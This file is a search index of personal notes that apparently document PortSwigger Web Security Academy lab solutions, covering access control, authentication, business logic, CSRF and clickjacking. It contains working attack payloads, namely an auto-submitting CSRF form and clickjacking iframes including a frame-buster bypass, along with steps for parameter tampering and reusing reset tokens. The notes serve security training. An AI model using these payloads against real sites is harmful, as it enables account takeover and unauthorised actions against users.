{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome","text":"<ul> <li>Herein lies a user friendly repo to my notes.</li> </ul>"},{"location":"#whoami","title":"<code>whoami</code>","text":"<ul> <li>I am irboi746, an IT enthusiast with focus in Cyber Security</li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/","title":"Access Control Vulnerabilities","text":"<ul> <li>Access control vulnerabilities is explained in this link. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#unprotected-admin-panel","title":"Unprotected Admin Panel","text":"<ul> <li>This lab has an unprotected admin panel. Solve the lab by deleting the user carlos.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration","title":"Enumeration","text":"<ul> <li>First we run gobuster with <code>common.txt</code> as wordlist to enumerate . </li> <li>And from the enumeration we see that there is a robots.txt file. From the robots.txt file, we can see that there is an administration-panel that is disallowed. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We attempt to checkout the administration panel and realised that no authentication needed for administration panel </li> <li>Proceeds to delete carlos.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#unprotected-admin-functionality-with-unpredictable-url","title":"Unprotected admin functionality with unpredictable URL","text":"<ul> <li>This lab has an unprotected admin panel. It's located at an unpredictable location, but the location is disclosed somewhere in the application.</li> <li>Solve the lab by accessing the admin panel, and using it to delete the user carlos.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_1","title":"Enumeration","text":"<p> - View Page Source and found a script that reveals admin panel if certain conditions are met.  - Ran gobuster to enumerate the directories with <code>common.txt</code> as wordlist. Nothing interesting was found here. </p>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessmentexploitation","title":"Vulnerability Assessment/Exploitation","text":"<ul> <li>Using burp suite, intercept the response traffic and change <code>var isAdmin = false</code> to <code>var isAdmin=false</code> </li> <li>The page we will see is as below, an Admin panel tab is revealed. The directory to administration panel is <code>/admin-1t5ka4</code> </li> <li>We proceed to go to the administration panel and delete <code>carlos</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-role-controlled-by-request-parameter","title":"User role controlled by request parameter","text":"<ul> <li> <p>This lab has an admin panel at <code>/admin</code>, which identifies administrators using a forgeable cookie.</p> </li> <li> <p>Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_2","title":"Enumeration","text":"<ul> <li>We intercept the traffic when navigating to the <code>/admin</code> directory and in the intercepted <code>GET</code> request we found that there is a cookie value <code>Admin=false</code>.  When the corresponding cookie value is used, the below response is returned. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We attempt to reach the administration panel by manipulating the cookie value <code>Admin=false</code> to <code>Admin=true</code>. </li> <li>We arrive at the adminstration panel. However, we will need to constantly manipulate this <code>GET</code> request.  </li> <li>We proceed to delete carlos and change the cookie value from <code>Admin=false</code> to <code>Admin=true</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-role-can-be-modified-in-user-profile","title":"User role can be modified in user profile","text":"<ul> <li> <p>This lab has an admin panel at <code>/admin</code>. It's only accessible to logged-in users with a <code>roleid</code> of 2.</p> </li> <li> <p>Solve the lab by accessing the admin panel and using it to delete the user carlos. You can log in to your own account using the following credentials: <code>wiener:peter</code></p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_3","title":"Enumeration","text":"<ul> <li>We first conduct our enumeration by querying <code>/admin</code> to see if there is any  <code>GET</code> request parameter that can be manipulated.    As can be seen above, there is nothing interesting here. Just that, we know that we do not have the correct authorization.</li> <li>We then proceed to login with <code>wiener:peter</code> and we are lead to the page below. </li> <li>We used burp to intercept the traffic that is sent and threw it to repeater to check the response. </li> <li>Oddly enough, the proxy was not able to catch the response below.  </li> <li>From the above response on the right, we see that there is the vulnerable parameter <code>roleid</code>. It seems like, the POST request on the right will be processed and redirected by the webserver.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_2","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Therefore, we should be able to add the additional parameters into the original <code>POST</code> request and change <code>roleid: 1</code> to <code>roleid: 2</code> as seen below. We passed it to the HTTP request intercepted at the proxy. </li> <li>Below, we can see that we have successfully bypassed the authorization, an we now have the <code>Admin panel</code> tab. </li> <li>After this, we proceed to delete <code>carlos</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-id-controlled-by-request-parameter","title":"User ID controlled by request parameter","text":"<ul> <li>This lab has a horizontal privilege escalation vulnerability on the user account page.</li> <li>To solve the lab, obtain the API key for the user <code>carlos</code> and submit it as the solution. You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_4","title":"Enumeration","text":"<ul> <li>Logged into the account and saw that the URL has a parameter <code>my-account?id=wiener</code>. </li> <li>Additionally, the link to <code>My Account</code> tab is referenced to <code>/my-account?id=wiener</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_3","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Hence we just simply need to change <code>wiener</code> to <code>carlos</code>. </li> <li>The API key <code>koxW0InLMGBNCkwGej2BduZUgmSi8NAF</code> is leaked. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-id-controlled-by-request-parameter-with-unpredictable-user-ids","title":"User ID controlled by request parameter, with unpredictable user IDs","text":"<ul> <li> <p>This lab has a horizontal privilege escalation vulnerability on the user account page, but identifies users with <code>GUIDs</code>.</p> </li> <li> <p>To solve the lab, find the <code>GUID</code> for <code>carlos</code>, then submit his API key as the solution. You can log in to your own account using the following credentials: <code>wiener:peter</code>. </p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_5","title":"Enumeration","text":"<ul> <li>Upon looking at the intercepted response, we see that the account id is no longer the name but a string of numbers. </li> <li>However, despite that, it is still vulnerable to the attack used above, just that we will need to find out the account ID of <code>carlos</code>. </li> <li>Upon further exploration of the blog, we found out that the users post on the blog and their user account is referenced with a link. </li> <li>On top of that, the account ID is in the URL when we clicked on the referenced link. </li> <li>We found a post written by carlos and therefore also found his account ID <code>c5899ede-9ba5-4237-811d-ec61698c2799</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_4","title":"Vulnerability Assessment / Exploitation","text":"<p>Now to exploit this, we simply need to append <code>/my-account?id=c5899ede-9ba5-4237-811d-ec61698c2799</code> like below and we will get to the my-account page.   API key : <code>LGd3ou8CqEGN9g2LU57t5usEbRVoXmvt</code></p>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-id-controlled-by-request-parameter-with-data-leakage-in-redirect","title":"User ID controlled by request parameter with data leakage in redirect","text":"<ul> <li>This lab contains an access control vulnerability where sensitive information is leaked in the body of a redirect response.</li> <li>To solve the lab, obtain the API key for the user carlos and submit it as the solution. You can log in to your own account using the following credentials: <code>wiener:peter</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_6","title":"Enumeration","text":"<ul> <li>We initially logged in as <code>wiener</code> and realised that the account ID is simply the name and it is parsed through the URL. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_5","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>With this, we attempted to simply just change the account id to carlos.  </li> <li>In the response, before the redirection to the Login Page, we get a leaked <code>carlos</code> account page as seen below.  API Key is : <code>1b27kaCW9WcohYtc9HktRdA01s16ILOl</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#user-id-controlled-by-request-parameter-with-password-disclosure","title":"User ID controlled by request parameter with password disclosure","text":"<ul> <li>This lab has user account page that contains the current user's existing password, prefilled in a masked input.</li> <li>To solve the lab, retrieve the administrator's password, then use it to delete carlos. You can log in to your own account using the following credentials: <code>wiener:peter</code>. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_7","title":"Enumeration","text":"<ul> <li>We log in with the given credentials wiener:peter and we get to this page where we see that there is a mask for the password. </li> <li>However, upon inspecting page source, we see that the password is in plain. </li> <li>Additionally, we found that the <code>href</code> of 'My Account' tab is   </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_6","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Hence we might be able to bypass authentication and head straight to <code>/my-account?id=administrator</code> </li> <li>We view page source to reveal the <code>administrator</code> password : <code>pz8t43px3spymeww275t</code> </li> <li>We login as administrator and we go proceed to delete carlos from Admin Panel </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#insecure-direct-object-references","title":"Insecure Direct Object References","text":"<ul> <li>This lab stores user chat logs directly on the server's file system, and retrieves them using static URLs.</li> <li>Solve the lab by finding the password for the user carlos, and logging into their account. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#enumeration_8","title":"Enumeration","text":"<ul> <li>We navigate to the \"Live Chat\" page from the \"Live Chat\" tab. </li> <li>We see two functions \"Send\" and \"View Transcript\". </li> <li>We visit <code>viewTranscript.js</code> and get the below script. The script seems to be suggesting that there is a download action. </li> <li>As we can see below, a <code>POST</code> HTTP request is sent </li> <li>Then we get a <code>GET</code> request to a web directory <code>/download-transcript/3.txt</code> </li> <li>Then a download pop-up pops out. Seems like, the \"View Transcript\" function is downloading from that particular directory.</li> <li>There also seems to be a pattern in the transcript numbering i.e <code>3.txt</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Access%20Control%20Vulnerabilities/#vulnerability-assessment-exploitation_7","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We try to see if there are any text files prior to out transcript. </li> <li>It seems like there is a file by the number of <code>1.txt</code>. </li> <li>Content of 1.txt is below :  </li> <li>So it seems like there is a user whose password is : <code>i2iotr5lot10za1mf9pb</code></li> <li>We can assume it's carlos for lab purposes and true enough, it is carlos's account password. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/","title":"Authentication","text":""},{"location":"Burp_Academy/Apprentice/Authentication/#username-enumeration-via-different-responses","title":"Username enumeration via different responses","text":"<ul> <li>This lab is vulnerable to username enumeration and password brute-force attacks. It has an account with a predictable username and password, which can be found in the given wordlists.</li> <li>To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#enumeration","title":"Enumeration","text":"<p> - We tried to login with random credentials and realised that there is a \"Invalid username\".  - We realised that logging in is through POST request. </p>"},{"location":"Burp_Academy/Apprentice/Authentication/#vulnerability-assessmemnt-exploitation","title":"Vulnerability Assessmemnt / Exploitation","text":"<ul> <li>We will try to test with the given username list with Burp Intruder using Sniper attack type.  </li> <li>From the above, we can see that atlanta is the one with a different response length compared to other responses.  </li> <li>We realised that our hypothesis above is right that a correct username can be enumerated. </li> <li>Next we set the password field as the field to attack. </li> <li>From the above, we see that with the password <code>computer</code>, there is a <code>HTTP 302</code> (redirect). This is likely the correct credentials. </li> <li>We login with the credentials <code>atlanta:computer</code> and we managed to login.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#2fa-simple-bypass","title":"2FA simple bypass","text":"<ul> <li>This lab's two-factor authentication can be bypassed. </li> <li>You have already obtained a valid username and password, but do not have access to the user's 2FA verification code. </li> <li>To solve the lab, access Carlos's account page. Your credentials: <code>wiener:peter</code> and Victim's credentials <code>carlos:montoya</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#enumeration_1","title":"Enumeration","text":"<ul> <li>As this is a 2FA bypass challenge, we will skip the thorough mapping of the website. Below is the \"Home\" page. </li> <li>We simply, go directly to the login page and is faced with the page below. </li> <li>We then attempt login with <code>wiener:peter</code> credentials and got to the 2FA page below. </li> <li>We go to the email client and retrieved the 2FA code to login to the account. </li> <li>Then we get to the page below. </li> <li>The transactions above are logged in burp proxy and can be seen below. We repeated the steps above, but did not key in the correct 2FA the next time. </li> <li>As can be seen above, a successful login procedures are as follows  <pre><code>graph LR\n\n1[GET /login] --&gt; 2[POST /login] --&gt; 3[GET /login2] --&gt; 4[POST /login2] --&gt; 5[GET /my-account]</code></pre></li> <li>We then examine the Request/Response in the sequence above to see if there might be any clue.  </li> <li>Looking closely at the logic above, we see that the session cookie produced by <code>/login</code> and <code>/login2</code> are different. </li> <li>However, we do notice that <code>/login</code> and <code>/login2</code> are 2 different resources and that the session cookie generated by <code>/login</code> will allow access to <code>/login2</code> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Going by the logic above, there might be a possibility that <code>/my-account</code> can also be accessed by the session cookie generated by <code>/login2</code>.   </li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#password-reset-broken-logic","title":"Password reset broken logic","text":"<ul> <li>This lab's password reset functionality is vulnerable. </li> <li>To solve the lab, reset Carlos's password then log in and access his \"My account\" page. </li> <li>Your credentials: <code>wiener:peter</code> and Victim's username: <code>carlos</code>.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#enumeration_2","title":"Enumeration","text":"<ul> <li>As this is a password reset challenge, we will skip the thorough mapping of the website. Below is the \"Home\" page. </li> <li>We simply, go directly to the login page and is faced with the page below.</li> <li>There is a \"Forgot password\" button. </li> <li>We map the login process by logging in with <code>wiener:peter</code> and the result is as follows. </li> <li>We then go on to map the forget password process by accessing the \"Forgot password\" button. We get the page below. </li> <li>Then we subsequently submitted a password reset request using wiener's username. </li> <li>Below is the link received by wiener's email. </li> <li>The webpage below is the reset password page. </li> <li>An interesting observation is the password reset request as seen below. </li> <li>The temporary token, username to reset and new password are passed as a parameters for password reset. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Authentication/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Continuing from the thought process above, we can test if the token is universal or that we can reuse the same token but change the username.</li> <li>We used burp repeater to send the request and changed username from <code>wiener</code> to <code>carlos</code>. </li> <li>We attempt to login to carlos with the password we set and we were successful. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/","title":"Business Logic Vulnerabilities","text":"<ul> <li>In this link we can understand what is meant by business logic vulnerabilities and its impact. This link here gives a more detailed and more example driven explanation of what is meant by business logic vulnerabilities.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#excessive-trust-in-client-side-controls","title":"Excessive trust in client-side controls","text":"<ul> <li>This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. </li> <li>To solve the lab, buy a \"Lightweight l33t leather jacket\". You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#enumeration","title":"Enumeration","text":"<ul> <li>We are given the webpage below, where it is an ecommerce shop, with a shopping cart.</li> </ul> <ul> <li>We can view products and even add to cart like below.</li> </ul> <ul> <li>There is user login</li> </ul> <ul> <li>When we login, we can see that there is a \"Store Credit\" as well as a user cart which is different from an anonymous cart.</li> </ul> <ul> <li>There is a <code>/cart</code> page where products that are added will show. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#vulnerability-assessment-exploitation","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>The vulnerable function in this case is the way where products are added to cart.</li> <li>As can be seen below, a product is added to cart and rather than fetching the price from the database, the product details are sent as a <code>POST</code> request.</li> </ul> <ul> <li>Therefore it seems like we can manipulate the price of the jacket simply by changing the price in the <code>POST</code> request like below.</li> </ul> <ul> <li>As can be seen below, the product is added to cart and we sucessfully checked out with a significantly low price for the product.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#high-level-logic-vulnerability","title":"High-level logic vulnerability","text":"<ul> <li> <p>This lab doesn't adequately validate user input. You can exploit a logic flaw in its purchasing workflow to buy items for an unintended price. To solve the lab, buy a \"Lightweight l33t leather jacket\".</p> </li> <li> <p>You can log in to your own account using the following credentials: <code>wiener:peter</code>.</p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#enumeration_1","title":"Enumeration","text":"<ul> <li>We are given an ecommerce page that looks similar to the one above, with very similar functionalities with regards to the checkout and login.</li> </ul> <ul> <li>The difference in this web application is that the price is no longer sent in the POST request.  </li> <li>As can seen above, the only variable that can be manipulated here is the quantity.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#vulnerability-assessment-exploitation_1","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>We then realised that quantity can actually be set to <code>-1</code>. </li> </ul> <ul> <li>We then intercepted the POST request and tested if the value can be set to more than <code>-1</code>.</li> </ul> <ul> <li>As can be seen below, the quantity is set to <code>-3</code></li> </ul> <ul> <li>Additionally, we realised that \"Add to cart\" button is not the only button vulnerable to this. The \"-\",  \"+\" and \"remove\" buttons are vulnerable to this too.</li> </ul> <ul> <li>It seems like there is a check for negative total value.</li> <li>We can get our item \"Lightweight 'l33t' Leather Jacket\" with a huge \"discount\" by setting other items to be a negative value and the leather jacket to a positive value.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#inconsistent-security-controls","title":"Inconsistent security controls","text":"<ul> <li>This lab's flawed logic allows arbitrary users to access administrative functionality that should only be available to company employees. </li> <li>To solve the lab, access the admin panel and delete Carlos. </li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#enumeration_2","title":"Enumeration","text":"<ul> <li>We do an initial directory enumeration and find that there is an <code>/admin</code> directory but it returns us a <code>401 Unauthorized</code> error.</li> </ul> <ul> <li>Concurrently, we attached burp proxy and surfed the website normally trying all the functionalities</li> </ul> <ul> <li>It seems like there is no \"Add to cart\" function. </li> </ul> <ul> <li>There is a login page, but we are not given credentials. However, we also notice a register page.</li> </ul> <ul> <li>In this register page, it seems like anyone can register but we notice that for workers that work for DontWannaCry, their email domain is <code>@dontwannacry.com</code>. We are not given a donwannacry.com email but it might be useful later.</li> </ul> <ul> <li>Registering for a new user witht the email given to us.</li> </ul> <ul> <li>We go to the email given and followed the link to complete the registration.</li> </ul> <ul> <li>We are brought to the following page upon login, where the only function is to change our email address.</li> </ul> <ul> <li>It seems like the error message for <code>/admin</code> page is that we are not a DontWannaCry user.</li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#vulnerability-assessment-exploitation_2","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Based on the information above, where DontWannaCry users have email address of <code>@dontwannacry.com</code> perhaps, we can bypass the authentication by simply having a dontwannacry email.</li> </ul> <ul> <li>We changed our email domain to <code>dontwannacry.com</code> and in the next picture, we can see that the admin panel appears.</li> </ul> <p> - We proceed to the <code>/admin</code> page and delete the user <code>carlos</code>.</p> <p></p>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#flawed-enforcement-of-business-rules","title":"Flawed enforcement of business rules","text":"<ul> <li>This lab has a logic flaw in its purchasing workflow. To solve the lab, exploit this flaw to buy a \"Lightweight l33t leather jacket\".</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#enumeration_3","title":"Enumeration","text":"<ul> <li>We visit the website and we get one like below, where they give out coupon and there is a cart, thus suggesting that the ecommerce function is working in this application.</li> </ul> <p> - We scroll to the bottom of the page to see this \"Sign up to our newsletter\" function.</p> <p></p> <ul> <li>Based on the client side source code, it seems like this sends a POST request with email account as a parameter to the <code>/sign-up</code> page. </li> </ul> <p></p> <ul> <li>Upon sucessful sign up, the section changed into a javascript that prompts another discount code.</li> </ul> <p> </p> <ul> <li>There is indeed an add to cart function.</li> </ul> <p></p> <ul> <li>There is also a login function and this time credentials are given and hence we will need to log in with the given credentials.</li> </ul> <p></p> <ul> <li>So this is a view of the user <code>/account</code> page.</li> </ul> <p></p> <ul> <li>Below is a picture of the user cart.</li> </ul> <p></p> <ul> <li>When a coupon is applied it will be appended to a HTML table like below.</li> </ul> <p></p> <ul> <li>There is checks to make sure the same coupon cannot be applied twice.</li> </ul> <p></p> <ul> <li>There is also a check to make sure invalid coupon cannot be used.</li> </ul> <p></p> <ul> <li>Below are the GET redirects when a coupon is applied sucessfully, or unsucessfully respectively. </li> </ul> <p> </p>"},{"location":"Burp_Academy/Apprentice/Business%20Logic%20Vulnerabilities/#vulnerability-assessment-exploitation_3","title":"Vulnerability Assessment / Exploitation","text":"<ul> <li>Even though there are checks for the same coupon used consecutively, it seems like if a new coupon is added, we are able to stack the discount.</li> </ul> <ul> <li>And the best part is we can stack as many discounts as we want as long as they are not consecutive.</li> </ul> <ul> <li>Hence we stacked the coupon till the price of \"Lightweight 'l33t' Leather Jacket\" is zero before we make the purchase.</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/","title":"CSRF, Clickjacking and CORS","text":"<ul> <li>CRSF (Cross Site Request Forgery) is explained in this link here.</li> <li>CSRF token is used to defend against CSRF and more information about how it works here</li> <li>Clickjacking differs from a CSRF attack in that the user is required to perform an action such as a button click whereas a CSRF attack depends upon forging an entire request without the user's knowledge or input. </li> <li>CORS (Cross Origin Resource Sharing) is a browser mechanism which enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the same-origin policy (SOP). More about CORS and its vulnerabilities here.</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#csrf-vulnerability-with-no-defenses","title":"CSRF vulnerability with no defenses","text":"<ul> <li>To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server. </li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration","title":"Enumeration","text":"<ul> <li>First we need to check for the 3 conditions for CSRF to happen : </li> </ul> Condition Screenshot Relevant Action User can update email Cookie Based Session Handling When attempting to change email address only cookie is used as authentication  No unpredictable request parameters There does not seem to be any unpredictable parameters."},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#vulnerability-assessment","title":"Vulnerability Assessment","text":"<ul> <li>We can use Burp Pro function <code>Generate CSRF PoC</code>. Without Burp Pro, we just need to generate the HTML PoC manually. </li> <li>We will want the auto-submit script to be enabled so that no-click is required. </li> <li>Then simply copy-and-paste the generated PoC into the body of the exploit server. <pre><code>&lt;html&gt;\n  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;\n  &lt;body&gt;\n  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;\n    &lt;form action=\"https://0a980072046df11fc0633c5f00230008.web-security-academy.net/my-account/change-email\" method=\"POST\"&gt;\n      &lt;input type=\"hidden\" name=\"email\" value=\"wiener&amp;#64;super&amp;#45;user&amp;#46;net\" /&gt;\n      &lt;input type=\"submit\" value=\"Submit request\" /&gt;\n    &lt;/form&gt;\n    &lt;script&gt;\n      document.forms[0].submit();\n    &lt;/script&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre></li> <li>What this HTML essentially does is create a form with \"Submit Request\" button and that button will do a POST request to the email change-account page to the parameter value of <code>wiener@super-user.net</code></li> </ul> <p>  - As can be seen above, after the button click, <code>wiener@normal-user.net</code> is changed to <code>wiener@super-user.net</code>.</p>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#basic-clickjacking-with-csrf-token-protection","title":"Basic clickjacking with CSRF token protection","text":"<ul> <li>This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word \"click\" on a decoy website.</li> <li>To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.</li> <li>You can log in to your own account using the following credentials: wiener:peter</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration_1","title":"Enumeration","text":"<ul> <li>We login to the account given and there is a \"Delete account\" button. Our goal it seems is to trick user into clicking \"Delete account\". </li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#exploitation","title":"Exploitation","text":"<ul> <li>We create a new webpage with the HTML code below : </li> </ul> <pre><code>&lt;style&gt;\n    iframe {\n        position:relative;\n        width:500;\n        height: 700;\n        opacity: 0.001;\n        z-index: 2;\n    }\n    div {\n        position:absolute;\n        top:500;\n        left:64;\n        z-index: 1;\n    }\n&lt;/style&gt;\n&lt;div&gt;click me&lt;/div&gt;\n&lt;iframe src=\"https://0adb00d203113416c070200900790092.web-security-academy.net/my-account\"&gt;&lt;/iframe&gt;\n</code></pre> <ul> <li>The below page is created with <code>opacity : 0.5</code> so that we can see if click me is on top of \"Delete account\".</li> </ul> <ul> <li>Actual exploit page </li> </ul> <ul> <li>To solve the lab, we simply \"Deliver exploit to victim\".</li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#clickjacking-with-form-input-data-prefilled-from-a-url-parameter","title":"Clickjacking with form input data prefilled from a URL parameter","text":"<ul> <li>This lab extends #Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an \"Update email\" button.</li> <li>To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a \"Click me\" decoy. The lab is solved when the email address is changed.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration_2","title":"Enumeration","text":"<ul> <li> <p>We log in to the login page to see how the \"Update email\" looks like. </p> </li> <li> <p>We attempt to update the email and as can be seen below, the Body parameter will need to contain <code>email=&lt;email address&gt;</code></p> </li> </ul> <p></p>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#exploitation_1","title":"Exploitation","text":"<ul> <li>With reference to the above exploit used we just need to append the <code>email=</code> into the url as a parameter. Below is the <code>iframe</code> that is different from the exploit above.</li> </ul> <pre><code>&lt;div&gt;click me&lt;/div&gt;\n&lt;iframe src=\"https://0a6600b2038d7581c07e073c0094007e.web-security-academy.net/my-account?email=attacker@email.com\"&gt;&lt;/iframe&gt;\n</code></pre> <ul> <li>Below is set at <code>opacity: 0.5;</code> so that we can see if \"click me\" is aligned.</li> </ul> <ul> <li> <p>Acutal exploit </p> </li> <li> <p>We simply need to send the following HTML frame and lab is solved.</p> </li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#clickjacking-with-a-frame-buster-script","title":"Clickjacking with a frame buster script","text":"<ul> <li>This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?</li> <li>To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on \"Click me\". The lab is solved when the email address is changed.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#enumeration_3","title":"Enumeration","text":"<ul> <li>The webpage given is the same as #Clickjacking with form input data prefilled from a URL parameter.</li> </ul> <ul> <li>Only difference is a frame busting javascript.</li> </ul> <ul> <li>Basic clickjacking is averted as can be seen below. </li> </ul>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#exploitation_2","title":"Exploitation","text":"<ul> <li>The work around for frame buster would be <code>sandbox=\"allow-forms\"</code> a HTML5 iframe \"sandbox\" attribute. </li> <li>As framebuster is a javascript, by adding the sandbox attribute to only \"allow-forms\" we essentially blocked the javascript from executing.</li> <li>As can be seen below, when the sandbox attribute is added, the iframe is loaded.</li> </ul> <pre><code>&lt;/style&gt;\n&lt;div&gt;click me&lt;/div&gt;\n&lt;iframe src=\"https://0a3d003803725875c09e38c000dd0047.web-security-academy.net/my-account?email=aaa@attacker.com\" sandbox=\"allow-forms\" &gt;&lt;/iframe&gt;\n</code></pre>"},{"location":"Burp_Academy/Apprentice/CSRF%2C%20Clickjacking%20and%20CORS/#cors-vulnerability-with-basic-origin-reflection","title":"CORS vulnerability with basic origin reflection","text":"<ul> <li>This website has an insecure CORS configuration in that it trusts all origins.</li> <li>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.</li> <li>You can log in to your own account using the following credentials: <code>wiener:peter</code></li> 